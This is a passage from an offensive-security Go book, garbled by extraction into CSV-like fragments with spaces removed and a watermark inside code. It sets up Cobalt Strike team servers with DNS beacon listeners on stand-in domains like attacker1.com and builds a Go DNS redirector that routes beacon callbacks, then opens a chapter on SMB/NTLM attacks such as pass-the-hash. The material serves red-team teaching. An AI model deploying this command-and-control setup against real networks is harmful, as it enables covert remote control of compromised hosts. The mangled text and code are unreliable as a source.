"thetrialmessage,changetheteamserverportto50051andset ",NA,NA
yourusernameandpasswordaccordingly.,NA,NA
You’vesuccessfullystartedandconnectedtoaserver ,NA,NA
"runningcompletelyinDocker!Now,let’sstartasecondserver ",NA,NA
byrepeatingthesameprocess.Followthepreviousstepsto ,NA,NA
"startanewteamserver.Thistime,you’llmapdifferentports.",NA,NA
Incrementingtheportsbyoneshoulddothetrickandis ,NA,NA
"logical.Inanewterminalwindow,executethefollowing ",NA,NA
commandtostartanewcontainerandlistenonports2021and ,NA,NA
50052:,"$
 dockerrun--rm-it-p2021:53-p50052:50050-v
 fullpathtocobaltstrike
  
  
 download
 :/datajava/bin/bash",NA
"FromtheCobaltStrikeclient,createanewconnectionby ",NA,NA
selecting,NA,NA
CobaltStrike,NA,NA
▶,NA,NA
NewConnection,NA,NA
",modifyingthe",NA,NA
"portto50052,andselecting",NA,NA
Connect,NA,NA
".Onceconnected,you ",NA,NA
"shouldseetwotabsatthebottomoftheconsole,whichyou ",NA,NA
canusetoswitchbetweenservers.,NA,NA
Nowthatyou’vesuccessfullyconnectedtothetwo ,NA,NA
"teamservers,youshouldstarttwoDNSlisteners.Tocreatea ",NA,NA
"listener,select",NA,NA
ConfigureListeners,NA,NA
fromthemenu;itsicon ,NA,NA
"lookslikeapairofheadphones.Oncethere,select",NA,NA
Add,NA,NA
from ,NA,NA
thebottommenutobringuptheNewListenerwindow.Enter ,NA,NA
thefollowinginformation:,"Name:
 DNS1
  
  
 Payload:
 windows/beacon_dns/reverse_dns_txt
  
  
 Host:
 <IPaddressofhost>
  
  
 Port:
 0",NA
"Inthisexample,theportissetto80,butyourDNSpayload ",NA,NA
"stillusesport53,sodon’tworry.Port80isspecificallyused ",NA,NA
forhybridpayloads.,NA,NA
Figure5-2,NA,NA
showstheNewListener ,NA,NA
windowandtheinformationyoushouldbeentering.,NA,NA
"Next,you’llbepromptedtoenterthedomainstousefor ",NA,NA
"beaconing,asshownin",NA,NA
Figure5-3,NA,NA
.,NA,NA
Enterthedomain,NA,NA
attacker1.com,NA,NA
"astheDNSbeacon,which ",NA,NA
shouldbethedomainnametowhichyourpayloadbeacons. ,NA,NA
Youshouldseeamessageindicatingthatanewlistenerhas ,NA,NA
"started.Repeattheprocesswithintheotherteamserver,using ",NA,NA
DNS2and,NA,NA
attacker2.com,NA,NA
.Beforeyoustartusingthesetwo ,NA,NA
"listeners,you’llneedtowriteanintermediaryserverthat ",NA,NA
inspectstheDNSmessagesandroutesthemappropriately. ,NA,NA
"This,essentially,isyourproxy.",NA,NA
CreatingaDNSProxy,NA,NA
TheDNSpackageyou’vebeenusingthroughoutthischapter ,NA,NA
"makeswritinganintermediaryfunctioneasy,andyou’ve ",NA,NA
alreadyusedsomeofthesefunctionsinprevioussections.,NA,NA
Yourproxyneedstobeabletodothefollowing:,"Createahandlerfunctiontoingestanincomingquery
  
  
 Inspectthequestioninthequeryandextractthedomainname
  
  
 IdentifytheupstreamDNSservercorrelatingtothedomainname
  
  
 ExchangethequestionwiththeupstreamDNSserverandwritetheresponseto 
  
 theclient",NA
Yourhandlerfunctioncouldbewrittentohandle,NA,NA
attacker1.com,NA,NA
and,NA,NA
attacker2.com,NA,NA
"asstaticvalues,butthat’s ",NA,NA
"notmaintainable.Instead,youshouldlookuprecordsfroma ",NA,NA
"resourceexternaltotheprogram,suchasadatabaseora ",NA,NA
configurationfile.Thefollowingcodedoesthisbyusingthe ,NA,NA
formatof,"domain,server",NA
",whichliststheincomingdomainand",NA,NA
"upstreamserverseparatedbyacomma.Tostartyourprogram, ",NA,NA
createafunctionthatparsesafilecontainingrecordsinthis,NA,NA
format.Thecodein,NA,NA
Listing5-6,NA,NA
shouldbewrittenintoanew ,NA,NA
filecalled,NA,NA
main.go,NA,NA
.,"packagemain
  
 import( 
  
 ""bufio"" 
  
 ""fmt"" 
  
 ""os"" 
  
 ""strings"" 
  
 )
  
 ❶funcparse(filenamestring)(map[string]string❷,error
 ){ records:=make(map[string]string)
  
 fh,err:=os.Open(filename) 
  
 iferr!=nil{ 
  
 returnrecords,err 
  
 } 
  
 deferfh.Close() 
  
 scanner:=bufio.NewScanner(fh) 
  
 forscanner.Scan(){ 
  
 line:=scanner.Text() 
  
 parts:=strings.SplitN(line,"","",2) 
  
 iflen(parts)<2{ 
  
 returnrecords,fmt.Errorf(""%sisnotavalidline"",line) 
  
 } 
  
 records[parts[0]]=parts[1] 
  
 }
  
 returnrecords,scanner.Err()
  
 HivaNetwork.Com",NA
"Withthiscode,youfirstdefineafunction❶thatparsesa ",NA,NA
filecontainingtheconfigurationinformationandreturnsa ,map[string]string,NA
❷.You’llusethatmaptolookuptheincoming ,NA,NA
domainandretrievetheupstreamserver.,NA,NA
Enterthefirstcommandinthefollowingcodeintoyour ,NA,NA
"terminalwindow,whichwillwritethestringafter",echo,NA
intoa,NA,NA
filecalled,NA,NA
proxy.config,NA,NA
".Next,youshouldcompileandexecute ",NA,NA
dns_proxy.go,NA,NA
.,"$
 echo'attacker1.com,127.0.0.1:2020\nattacker2.com,127.0.0.1:2021'>
  
  
 proxy.config
  
  
 $
 gobuild
  
  
 $
 ./dns_proxy
  
  
 map[attacker1.com:127.0.0.1:2020attacker2.com:127.0.0.1:2021]",NA
Whatareyoulookingathere?Theoutputisthemapping ,NA,NA
betweenteamserverdomainnamesandtheportonwhichthe ,NA,NA
CobaltStrikeDNSserverislistening.Recallthatyoumapped ,NA,NA
ports2020and2021toport53onyourtwoseparateDocker ,NA,NA
containers.Thisisaquickanddirtywayforyoutocreate ,NA,NA
basicconfigurationforyourtoolsoyoudon’thavetostoreit ,NA,NA
inadatabaseorotherpersistentstoragemechanism.,NA,NA
"Withamapofrecordsdefined,youcannowwritethe",NA,NA
"handlerfunction.Let’srefineyourcode,addingthefollowing",NA,NA
toyour,main(),NA
function.Itshouldfollowtheparsingofyour,NA,NA
configfile.,"❶dns.HandleFunc(""."",func(wdns.ResponseWriter,req*dns.Msg)❷{
  
 ❸iflen(req.Question)<1{
  
 dns.HandleFailed(w,req)
  
 return
  
 }
  
  
 ❹name:=req.Question[0].Nam
 e parts:=strings.Split(name,""."")
  
  
 iflen(parts)>1{
  
   
 ❺name=strings.Join(parts[len(parts)-
 2:],""."") }
  
  
 ❻match,ok:=records[name] 
  
 if!ok{
  
 dns.HandleFailed(w,req)
  
 return
  
 }
  
  
 ❼resp,err:=dns.Exchange(req,match) 
 iferr!=nil{
  
 dns.HandleFailed(w,req)
  
 return
  
 }
  
  
 ❽iferr:=w.WriteMsg(resp);err!=nil{ 
 dns.HandleFailed(w,req)
  
 return
  
 }
  
 })
  
 ❾log.Fatal(dns.ListenAndServe("":53"",""udp"",nil))",NA
"Tobegin,call",HandleFunc(),NA
withaperiodtohandleall ,NA,NA
"incomingrequests❶,anddefinean",NA,NA
anonymousfunction,NA,NA
"❷, ",NA,NA
whichisafunctionthatyoudon’tintendtoreuse(ithasno,NA,NA
name).Thisisgooddesignwhenyouhavenointentionto,NA,NA
"reuseablockofcode.Ifyouintendtoreuseit,youshould",NA,NA
declareandcallitasa,NA,NA
namedfunction,NA,NA
".Next,inspectthe",NA,NA
incomingquestionsslicetoensurethatatleastonequestionis ,NA,NA
"provided❸,andifnot,call",HandleFailed(),NA
andreturntoexitthe ,NA,NA
functionearly.Thisisapatternusedthroughoutthehandler.If ,NA,NA
"atleastasinglequestiondoesexist,youcansafelypullthe ",NA,NA
requestednamefromthefirstquestion❹.Splittingthename ,NA,NA
byaperiodisnecessarytoextractthedomainname.Splitting ,NA,NA
"thenameshouldneverresultinavaluelessthan1,butyou ",NA,NA
shouldcheckittobesafe.Youcangrabthe,NA,NA
tail,NA,NA
oftheslice—,NA,NA
theelementsattheendoftheslice—byusingthe,slice,NA
operator ,NA,NA
"ontheslice❺.Now,youneedtoretrievetheupstreamserver ",NA,NA
fromtherecordsmap.,NA,NA
Retrievingavaluefromamap❻canreturnoneortwo ,NA,NA
"variables.Ifthekey(inourcase,adomainname)ispresenton ",NA,NA
"themap,itwillreturnthecorrespondingvalue.Ifthedomain ",NA,NA
"isn’tpresent,itwillreturnanemptystring.Youcouldcheckif ",NA,NA
"thereturnedvalueisanemptystring,butthatwouldbe ",NA,NA
inefficientwhenyoustartworkingwithtypesthataremore ,NA,NA
"complex.Instead,assigntwovariables:thefirstisthevalue ",NA,NA
"forthekey,andthesecondisaBooleanthatreturns",true,NA
ifthe,NA,NA
"keyisfound.Afterensuringamatch,youcanexchangethe ",NA,NA
requestwiththeupstreamserver❼.You’resimplymaking ,NA,NA
surethatthedomainnameforwhichyou’vereceivedthe ,NA,NA
"requestisconfiguredinyourpersistentstorage.Next,writethe ",NA,NA
responsefromtheupstreamservertotheclient❽.Withthe ,NA,NA
"handlerfunctiondefined,youcanstarttheserver❾.Finally, ",NA,NA
youcannowbuildandstarttheproxy.,NA,NA
"Withtheproxyrunning,youcantestitbyusingthetwo ",NA,NA
"CobaltStrikelisteners.Todothis,firstcreatetwostageless ",NA,NA
"executables.FromCobaltStrike’stopmenu,clicktheiconthat ",NA,NA
"lookslikeagear,andthenchangetheoutputto",NA,NA
WindowsExe,NA,NA
.,NA,NA
Repeatthisprocessfromeachteamserver.Copyeachofthese ,NA,NA
executablestoyourWindowsVMandexecutethem.The ,NA,NA
DNSserverofyourWindowsVMshouldbetheIPaddressof ,NA,NA
"yourLinuxhost.Otherwise,thetestwon’twork.",NA,NA
"Itmaytakeamomentortwo,buteventuallyyoushouldsee ",NA,NA
anewbeacononeachteamserver.Missionaccomplished!,NA,NA
FinishingTouches,NA,NA
"Thisisgreat,butwhenyouhavetochangetheIPaddressof ",NA,NA
"yourteamserverorredirector,orifyouhavetoaddarecord, ",NA,NA
you’llhavetorestarttheserveraswell.Yourbeaconswould ,NA,NA
"likelysurvivesuchanaction,butwhytaketheriskwhen ",NA,NA
there’samuchbetteroption?Youcanuseprocesssignalsto ,NA,NA
tellyourrunningprogramthatitneedstoreloadthe ,NA,NA
configurationfile.ThisisatrickthatIfirstlearnedfromMatt ,NA,NA
"Holt,whoimplementeditinthegreatCaddyServer.",NA,NA
Listing5-,NA,NA
7,NA,NA
"showstheprograminitsentirety,completewithprocess ",NA,NA
signalinglogic:,"packagemain
  
  
 import(
  
 ""bufio"" 
  
 ""fmt"" 
  
 ""log"" 
  
 ""os"" 
  
 ""os/signal"" 
  
 ""strings"" 
  
 ""sync""
  
 ""syscall""
  
  
 ""github.com/miekg/dns""
  
  
 )",NA
Thereareafewadditions.Sincetheprogramisgoingtobe,NA,NA
modifyingamapthatcouldbeinusebyconcurrent ,NA,NA
"goroutines,you’llneedtouseamutextocontrolaccess. A ",1,NA
mutex,NA,NA
"preventsconcurrentexecutionofsensitivecodeblocks, ",NA,NA
"allowingyoutolockandunlockaccess.Inthiscase,youcan ",NA,NA
use,RWMutex,NA
"❶,whichallowsanygoroutinetoreadwithout ",NA,NA
"lockingtheothersout,butwilllocktheothersoutwhena ",NA,NA
"writeisoccurring.Alternatively,implementinggoroutines ",NA,NA
"withoutamutexonyourresourcewillintroduceinterleaving, ",NA,NA
whichcouldresultinraceconditionsorworse.,NA,NA
"Beforeaccessingthemapinyourhandler,call",RLock,NA
❷to ,NA,NA
readavalueto,match,NA
";afterthereadiscomplete,",RUnlock,NA
❸is ,NA,NA
calledtoreleasethemapforthenextgoroutine.Inan ,NA,NA
"anonymousfunctionthat’srunningwithinanewgoroutine❹, ",NA,NA
youbegintheprocessoflisteningforasignal.Thisisdone ,NA,NA
usingachanneloftype,os.Signal,NA
"❺,whichisprovidedinthe ",NA,NA
callto,signal.Notify(),NA
❻alongwiththeliteralsignaltobe ,NA,NA
consumedbythe,SIGUSR1,NA
"channel,whichisasignalsetaside",NA,NA
"forarbitrarypurposes.Inaloopoverthesignals,usea",switch,NA
statement❼toidentifythetypeofsignalthathasbeen ,NA,NA
received.You’reconfiguringonlyasinglesignaltobe ,NA,NA
"monitored,butinthefutureyoumightchangethis,sothisis ",NA,NA
"anappropriatedesignpattern.Finally,",Lock(),NA
❽isusedpriorto ,NA,NA
reloadingtherunningconfigurationtoblockanygoroutines ,NA,NA
thatmaybetryingtoreadfromtherecordmap.Use,Unlock(),NA
❾to,NA,NA
continueexecution.,NA,NA
Let’stestthisprogrambystartingtheproxyandcreatinga ,NA,NA
newlistenerwithinanexistingteamserver.Usethedomain ,NA,NA
attacker3.com,NA,NA
".Withtheproxyrunning,modifythe ",NA,NA
proxy.config,NA,NA
fileandaddanewlinepointingthedomainto ,NA,NA
yourlistener.Youcansignaltheprocesstoreloadits,NA,NA
configurationbyusing,kill,NA
",butfirstuse",ps,NA
and,grep,NA
toidentify,NA,NA
theprocessID.,"$
 ps-ef|grepproxy
  
  
 $
 kill-10
 PID",NA
Theproxyshouldreload.Testitbycreatingandexecuting ,NA,NA
anewstagelessexecutable.Theproxyshouldnowbe ,NA,NA
functionalandproductionready.,NA,NA
SUMMARY,NA,NA
"Althoughthisconcludesthechapter,youstillhaveaworldof ",NA,NA
"possibilitiesforyourcode.Forexample,CobaltStrikecan ",NA,NA
"operateinahybridfashion,usingHTTPandDNSfordifferent ",NA,NA
"operations.Todothis,you’llhavetomodifyyourproxyto ",NA,NA
respondwiththelistener’sIPforArecords;you’llalsoneedto ,NA,NA
forwardadditionalportstoyourcontainers.Inthenext ,NA,NA
"chapter,you’lldelveintotheconvolutedcrazinessthatisSMB ",NA,NA
"andNTLM.Now,goforthandconquer!",NA,NA
6 ,NA,NA
INTERACTINGWITHSMBANDNTLM,NA,NA
"Inthepreviouschapters,youexaminedvariouscommon ",NA,NA
"protocolsusedfornetworkcommunication,includingraw ",NA,NA
"TCP,HTTP,andDNS.Eachoftheseprotocolshasinteresting ",NA,NA
usecasesforattackers.Althoughanextensivenumberofother ,NA,NA
"networkprotocolsexist,we’llconcludeourdiscussionof ",NA,NA
networkprotocolsbyexamining,NA,NA
ServerMessageBlock(SMB),NA,NA
", ",NA,NA
aprotocolthatarguablyprovestobethemostusefulduring ,NA,NA
Windowspost-exploitation.,NA,NA
SMBisperhapsthemostcomplicatedprotocolyou’llsee ,NA,NA
"inthisbook.Ithasavarietyofuses,butSMBiscommonly ",NA,NA
"usedforsharingresourcessuchasfiles,printers,andserial ",NA,NA
"portsacrossanetwork.Fortheoffensive-mindedreader,SMB ",NA,NA
allowsinterprocesscommunicationsbetweendistributed ,NA,NA
"networknodesvianamedpipes.Inotherwords,youcan ",NA,NA
executearbitrarycommandsonremotehosts.Thisis ,NA,NA
"essentiallyhowPsExec,aWindowstoolthatexecutesremote ",NA,NA
"commandslocally,works.",NA,NA
"SMBhasseveralotherinterestingusecases,particularly",NA,NA
duetothewayithandles,NA,NA
NTLANManager(NTLM) ,NA,NA
authentication,NA,NA
",achallenge-",NA,NA
responsesecurityprotocolused ,NA,NA
heavilyonWindowsnetworks.Theseusesincluderemote ,NA,NA
"passwordguessing,hash-basedauthentication(or",NA,NA
pass-,NA,NA
the-,NA,NA
hash,NA,NA
"),SMBrelay,andNBNS/LLMNRspoofing.Covering ",NA,NA
eachoftheseattackswouldtakeanentirebook.,NA,NA
We’llbeginthischapterwithadetailedexplanationofhow ,NA,NA
"toimplementSMBinGo.Next,you’llleveragetheSMB ",NA,NA
"packagetoperformremotepasswordguessing,usethepass-",NA,NA
the-hashtechniquetosuccessfullyauthenticateyourselfby ,NA,NA
"usingonlyapassword’shash,andcracktheNTLMv2hashof ",NA,NA
apassword.,NA,NA
THESMBPACKAGE,NA,NA
"Atthetimeofthiswriting,noofficialSMBpackageexistsin ",NA,NA
"Go,butwecreatedapackagewhereyoucanfindthebook-",NA,NA
friendlyversionat,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/blob/master/ch-,NA,NA
6/smb/,NA,NA
.Althoughwewon’tshowyou ,NA,NA
"everydetailofthispackageinthischapter,you’llstilllearn ",NA,NA
thebasicsofinterpretingtheSMBspecificationinorderto ,NA,NA
"createthebinarycommunicationsnecessaryto“speakSMB,”",NA,NA
"unlikeinpreviouschapters,whereyousimplyreusedfully ",NA,NA
compliantpackages.You’llalsolearnhowtouseatechnique ,NA,NA
called,NA,NA
reflection,NA,NA
toinspectinterfacedatatypesatruntimeand ,NA,NA
definearbitraryGostructurefieldtagstomarshaland ,NA,NA
"unmarshalcomplicated,arbitrarydata,whilemaintaining ",NA,NA
scalabilityforfuturemessagestructuresanddatatypes.,NA,NA
WhiletheSMBlibrarywe’vebuiltallowsonlybasic ,NA,NA
client-,NA,NA
"sidecommunications,thecodebaseisfairlyextensive.",NA,NA
You’llseerelevantexamplesfromtheSMBpackagesothat ,NA,NA
"youcanfullyunderstandhowcommunicationsandtasks,such ",NA,NA
"asSMBauthentication,work.",NA,NA
UNDERSTANDINGSMB,NA,NA
"SMBisanapplication-layerprotocol,likeHTTP,thatallows ",NA,NA
networknodestocommunicatewithoneanother.Unlike ,NA,NA
"HTTP1.1,whichcommunicatesusingASCII-readabletext, ",NA,NA
SMBisabinaryprotocolthatusesacombinationoffixed-and ,NA,NA
"variable-length,positional,andlittle-endianfields.SMBhas ",NA,NA
"severalversions,alsoknownas",NA,NA
dialects,NA,NA
"—thatis,versions2.0, ",NA,NA
"2.1,3.0,3.0.2,and3.1.1.Eachdialectperformsbetterthanits ",NA,NA
predecessors.Becausethehandlingandrequirementsvary ,NA,NA
"fromonedialecttothenext,aclientandservermustagreeon ",NA,NA
whichdialecttouseaheadoftime.Theydothisduringan ,NA,NA
initialmessageexchange.,NA,NA
"Generally,Windowssystemssupportmultipledialectsand ",NA,NA
choosethemostcurrentdialectthatboththeclientandserver ,NA,NA
support.Microsofthasprovided,NA,NA
Table6-1,NA,NA
",whichshows ",NA,NA
whichWindowsversionsselectwhichdialectduringthe ,NA,NA
negotiationprocess.(Windows10andWS2016—notshown ,NA,NA
inthegraphic—negotiateSMBversion3.1.1.),"Table6-1:
 SMBDialectsNegotiatedByWindowsVersions
  
  
 Operating
  
 Window
  
 Window
  
 Window
  
 Window
  
 Previous
  
 system
  
 s8.1WS
  
 s8WS
  
 s7WS
  
 sVista
  
 versions
  
 2012R2
  
 2012
  
 2008R2
  
 WS
  
 2008
  
 Windows
  
 SMB
  
 SMB3.0
  
 SMB2.1
  
 SMB2.0
  
 SMB1.0
  
 8.1
  
 3.02",NA
"Forthischapter,you’llusetheSMB2.1dialect,because ",NA,NA
mostmodernWindowsversionssupportit.,NA,NA
UnderstandingSMBSecurityTokens,NA,NA
SMBmessagescontain,NA,NA
securitytokens,NA,NA
usedtoauthenticate ,NA,NA
usersandmachinesacrossanetwork.Muchliketheprocessof ,NA,NA
"selectingtheSMBdialect,selectingtheauthentication ",NA,NA
mechanismtakesplacethroughaseriesofSessionSetup ,NA,NA
"messages,whichallowclientsandserverstoagreeona ",NA,NA
mutuallysupportedauthenticationtype.ActiveDirectory ,NA,NA
domainscommonlyuse,NA,NA
NTLMSecuritySupportProvider ,NA,NA
(NTLMSSP),NA,NA
",abinary,positionalprotocolthatusesNTLM ",NA,NA
passwordhashesincombinationwithchallenge-response ,NA,NA
tokensinordertoauthenticateusersacrossanetwork.,NA,NA
Challenge-responsetokens,NA,NA
arelikethecryptographicanswer ,NA,NA
toaquestion;onlyanentitythatknowsthecorrectpassword ,NA,NA
cananswerthequestioncorrectly.Althoughthischapter ,NA,NA
"focusessolelyonNTLMSSP,Kerberosisanothercommon ",NA,NA
authenticationmechanism.,NA,NA
SeparatingtheauthenticationmechanismfromtheSMB ,NA,NA
specificationitselfallowsSMBtousedifferentauthentication ,NA,NA
"methodsindifferentenvironments,dependingondomainand ",NA,NA
enterprisesecurityrequirementsaswellasclient-server ,NA,NA
"support.However,separatingtheauthenticationandtheSMB ",NA,NA
specificationmakesitmoredifficulttocreatean ,NA,NA
"implementationinGo,becausetheauthenticationtokensare ",NA,NA
AbstractSyntaxNotationOne(ASN.1),NA,NA
encoded.Forthis ,NA,NA
"chapter,youdon’tneedtoknowtoomuchaboutASN.1—just ",NA,NA
knowthatit’sabinaryencodingformatthatdiffersfromthe ,NA,NA
positionalbinaryencodingyou’lluseforgeneralSMB.This ,NA,NA
mixedencodingaddscomplexity.,NA,NA
UnderstandingNTLMSSPiscrucialtocreatinganSMB ,NA,NA
implementationthatissmartenoughtomarshalandunmarsh,NA,NA
al ,NA,NA
"messagefieldsselectively,whileaccountingforthepotential ",NA,NA
thatadjacentfields—withinasinglemessage—maybe ,NA,NA
encodedordecodeddifferently.Gohasstandardpackagesthat ,NA,NA
"youcanuseforbinaryandASN.1encoding,butGo’sASN.1 ",NA,NA
packagewasn’tbuiltforgeneral-purposeuse;soyoumusttake ,NA,NA
intoaccountafewnuances.,NA,NA
SettingUpanSMBSession,NA,NA
Theclientandserverperformthefollowingprocessto ,NA,NA
successfullysetupanSMB2.1sessionandchoosethe ,NA,NA
NTLMSSPdialect:,"1.
  TheclientsendsaNegotiateProtocolrequesttotheserver.Themessage 
  
 includesalistofdialectsthattheclientsupports.
  
 2.
  TheserverrespondswithaNegotiateProtocolresponsemessage,which 
  
 indicatesthedialecttheserverselected.Futuremessageswillusethatdialect.
  
 Includedintheresponseisalistofauthenticationmechanismstheserver 
 supports.",NA
YoumightnowbegintoseehowcomplicatedSMBisand ,NA,NA
understandwhythereisneitherastandardnorathird-,NA,NA
partyGo ,NA,NA
packagethatimplementstheSMBspecification.Ratherthan ,NA,NA
takeacomprehensiveapproachanddiscusseverynuanceof,NA,NA
"thelibrarieswecreated,let’sfocusonafewofthestructures, ",NA,NA
"messages,oruniqueaspectsthatcanhelpyouimplementyour ",NA,NA
ownversionsofwell-definednetworkingprotocols.Insteadof ,NA,NA
"extensivecodelistings,thischapterdiscussesonlythegood ",NA,NA
"stuff,sparingyoufrominformationoverload.",NA,NA
Youcanusethefollowingrelevantspecificationsasa ,NA,NA
"reference,butdon’tfeelobligatedtoreadeachone.AGoogle ",NA,NA
searchwillletyoufindthelatestrevisions.,NA,NA
MS-SMB2,NA,NA
TheSMB2specificationtowhichweattempted ,NA,NA
toconform.Thisisthemainspecificationofconcernand ,NA,NA
encapsulatesaGenericSecurityServiceApplication ,NA,NA
ProgrammingInterface(GSS-,NA,NA
API)structureforperforming authentication.,NA,NA
MS-SPNGandRFC4178,NA,NA
TheGSS-APIspecification ,NA,NA
withinwhichtheMS-NLMPdataisencapsulated.The ,NA,NA
structureisASN.1encoded.,NA,NA
MS-NLMP,NA,NA
Thespecificationusedforunderstanding ,NA,NA
NTLMSSPauthenticationtokenstructureandchallenge-,NA,NA
responseformat.Itincludesformulasandspecificsfor ,NA,NA
calculatingthingsliketheNTLMhashandauthentication ,NA,NA
"responsetoken.UnliketheouterGSS-APIcontainer, ",NA,NA
NTLMSSPdataisn’tASN.1encoded.,NA,NA
ASN.1,NA,NA
ThespecificationforencodingdatabyusingASN.1 ,NA,NA
format.,NA,NA
Beforewediscusstheinterestingsnippetsofcodefromthe ,NA,NA
"package,youshouldunderstandsomeofthechallengesyou ",NA,NA
needtoovercomeinordertogetworkingSMB ,NA,NA
communications.,NA,NA
UsingMixedEncodingofStructFields,NA,NA
"Aswealludedtoearlier,theSMBspecificationrequires ",NA,NA
"positional,binary,little-endian,fixed-andvariable-length ",NA,NA
encodingforthemajorityofthemessagedata.Butsomefields ,NA,NA
"needtobeASN.1encoded,whichusesexplicitlytagged ",NA,NA
"identifiersforfieldindex,type,andlength.Inthiscase,many ",NA,NA
oftheASN.1subfieldstobeencodedareoptionalandnot ,NA,NA
restrictedtoaspecificpositionororderwithinthemessage,NA,NA
field.Thismayhelpclarifythechallenge.,NA,NA
In,NA,NA
Listing6-1,NA,NA
",youcanseeahypothetical",Message,NA
structthat,NA,NA
presentsthesechallenges.,"typeFoostruct{
  
  
 Xint
  
  
 Y[]byte
  
  
 }
  
  
 typeMessagestruct{
  
  
 Aint//Binary,positionalencoding
  
  
 BFoo//ASN.1encodingasrequiredbyspec
  
  
 Cbool//Binary,positionalencoding
  
  
 }
  
 Listing6-1:Ahypotheticalexampleofastructrequiringvariablefieldencodings",NA
Thecruxoftheproblemhereisthatyoucan’tencodeall,NA,NA
thetypesinsidethe,Message,NA
structbyusingthesameencoding,NA,NA
schemebecause,B,NA
",a",Foo,NA
"type,isexpectedtobeASN.1",NA,NA
"encoded,whereasotherfieldsaren’t.",NA,NA
WritingaCustomMarshalingandUnmarshalingInterface,NA,NA
Recallfrompreviouschaptersthatencodingschemessuchas,NA,NA
JSONorXMLrecursivelyencodethestructandallfieldsby,NA,NA
usingthesameencodingformat.Itwascleanandsimple.You,NA,NA
"don’thavethesameluxuryhere,becauseGo’s",binary,NA
package,NA,NA
behavesthesameway—itencodesallstructsandstructfields,NA,NA
"recursivelywithoutacareintheworld,butthiswon’tworkfor",NA,NA
youbecausethemessagerequiresmixedencoding:,"binary.Write(
 someWriter
 ,binary.LittleEndian,
 message
 )",NA
Thesolutionistocreateaninterfacethatallowsarbitrary,NA,NA
typestodefinecustommarshalingandunmarshalinglogic,NA,NA
(,NA,NA
Listing6-2,NA,NA
).,"❶typeBinaryMarshallableinterface{
  
 ❷MarshalBinary(*Metadata)([]byte,error)
 ❸UnmarshalBinary([]byte,*Metadata)erro
 r
  
 }
  
 Listing6-2:Aninterfacedefinitionrequiringcustommarshalingandunmarshaling 
 methods",NA
"Theinterface❶,",BinaryMarshallable,NA
",definestwomethodsthat ",NA,NA
mustbeimplemented:,MarshalBinary(),NA
❷and,UnmarshalBinary(),NA
❸. ,NA,NA
Don’tworrytoomuchaboutthe,Metadata,NA
typepassedintothe,NA,NA
"functions,asit’snotrelevanttounderstandthemain ",NA,NA
functionality.,NA,NA
WrappingtheInterface,NA,NA
Anytypethatimplementsthe,BinaryMarshallable,NA
interfacecan,NA,NA
"controlitsownencoding.Unfortunately,it’snotassimpleas ",NA,NA
justdefiningafewfunctionsonthe,Foo,NA
"datatype.Afterall,",NA,NA
Go’s,binary.Write(),NA
and,binary.Read(),NA
"methods,whichyouusefor",NA,NA
"encodinganddecodingbinarydata,don’tknowanything ",NA,NA
aboutyourarbitrarilydefinedinterface.Youneedtocreatea ,marshal(),NA
and,unmarshal(),NA
"wrapperfunction,withinwhichyou",NA,NA
inspectthedatatodeterminewhetherthetypeimplementsthe ,BinaryMarshallable,NA
"interface,asin",NA,NA
Listing6-3,NA,NA
.(Allthecode,NA,NA
listingsattherootlocationof/existundertheprovidedgithub ,NA,NA
repo,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.),"funcmarshal(vinterface{},meta*Metadata)([]byte,error){
  
  
 --snip--
  
 bm,ok:=v.(BinaryMarshallable)❶ifo
 k{
  
  
 //Custommarshallableinterfacefound.",NA
Listing6-3,NA,NA
detailsonlyasubsectionofthe,marshal(),NA
and,unmarshal(),NA
functionstakenfrom,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/blob/master/ch-,NA,NA
6/smb/smb/encoder/encoder.go,NA,NA
.Both ,NA,NA
functionscontainasimilarsectionofcodethatattemptsto ,NA,NA
"assertthesuppliedinterface,",v,NA
",toa",BinaryMarshallable,NA
variable ,NA,NA
named,bm,NA
❶❸.Thissucceedsonlyifwhatevertype,v,NA
is ,NA,NA
actuallyimplementsthenecessaryfunctionsrequiredbyyour ,BinaryMarshallable,NA
"interface.Ifitsucceeds,your",marshal(),NA
function,NA,NA
❷makesacallto,bm.MarshalBinary(),NA
",andyour",unmarshal(),NA
function,NA,NA
❹makesacallto,bm.UnmarshalBinary(),NA
".Atthispoint,your ",NA,NA
programflowwillbranchoffintothetype’sencodingand,NA,NA
"decodinglogic,allowingatypetomaintaincompletecontrol ",NA,NA
overthewayit’shandled.,NA,NA
ForcingASN.1Encoding ,NA,NA
Let’slookathowtoforceyour,Foo,NA
"typetobeASN.1encoded, ",NA,NA
whileleavingotherfieldsinyour,Message,NA
structas-is.Todo ,NA,NA
"this,youneedtodefinethe",MarshalBinary(),NA
and,UnmarshalBinary(),NA
"functionsonthetype,asin",NA,NA
Listing6-4,NA,NA
.,"func(f*Foo)MarshalBinary(meta*encoder.Metadata)([]byte,error){ 
 buf,err:=asn1.Marshal(*f)❶
  
 iferr!=nil{
  
 returnnil,err 
  
 } 
  
 returnbuf,nil
  
 }
  
  
 func(f*Foo)UnmarshalBinary(buf[]byte,meta*encoder.Metadata)error{
  
  
 data:=Foo{} 
  
 if_,err:=asn1.Unmarshal(buf,&data)❷;err!=nil{ 
 returnerr
  
 } 
  
 *f=data 
  
 returnnil
  
 }
  
 Listing6-4:Implementingthe
 BinaryMarshallable
 interfaceforASN.1encoding",NA
Themethodsdon’tdomuchbesidesmakecallstoGo’s ,asn1.Marshal(),NA
❶and,asn1.Unmarshal(),NA
❷functions.Youcanfind ,NA,NA
variationsofthesefunctionswithinthe,gss,NA
packagecodeat ,NA,NA
https://github.com/blackhat-go/bhg/blob/master/ch-,NA,NA
6/smb/gss/gss.go,NA,NA
.Theonlyrealdifferencebetweenthemis ,NA,NA
thatthe,gss,NA
packagecodehasadditionaltweakstomakeGo’s ,asn1,NA
encodingfunctionplaynicelywiththedataformatdefined,NA,NA
withintheSMBspec.,NA,NA
The,ntlmssp,NA
packageat,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/blob/master/ch-,NA,NA
6/smb/ntlmssp/ntlmssp.go,NA,NA
containsan ,NA,NA
alternativeimplementationofthe,MarshalBinary(),NA
and,UnmarshalBinary(),NA
functions.Althoughitdoesn’tdemonstrate,NA,NA
"ASN.1encoding,the",ntlmssp,NA
codeshowshowtohandle,NA,NA
encodingofanarbitrarydatatypebyusingnecessary ,NA,NA
metadata.Themetadata—thelengthsandoffsetsofvariable-,NA,NA
length,byte,NA
slices—ispertinenttotheencodingprocess.This,NA,NA
metadataleadsustothenextchallengeyouneedtoaddress.,NA,NA
